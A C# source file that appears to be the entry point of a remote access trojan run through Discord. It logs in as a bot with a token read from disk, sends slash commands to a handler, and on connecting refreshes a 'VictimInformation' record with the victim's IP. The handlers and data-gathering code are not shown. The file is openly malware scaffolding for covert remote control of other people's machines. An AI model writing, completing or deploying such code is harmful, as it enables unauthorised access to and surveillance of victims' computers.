using Discord;
using Discord.Rest;
using Discord.WebSocket;

namespace RAT;

public class MainRuntime
{
    public static DiscordSocketClient client = new();
    static readonly string tken = File.ReadAllText($"{Environment.CurrentDirectory}/token.tken");
    public static async Task Main()
    {
        await client.LoginAsync(TokenType.Bot, tken, true);

        client.Log += async log => await Task.Run(() => Console.WriteLine(log));
        client.SlashCommandExecuted += Handlers.SlashComamndReceived;
        client.Connected += async () =>
        {
            // Refresh the IP when connected to the Gateway
            while (!await VictimInformation.Shared.RefreshIP())
            {
                await Task.Delay(1000);
            }
        };
        await client.StartAsync();
        await Task.Delay(-1);
    }
}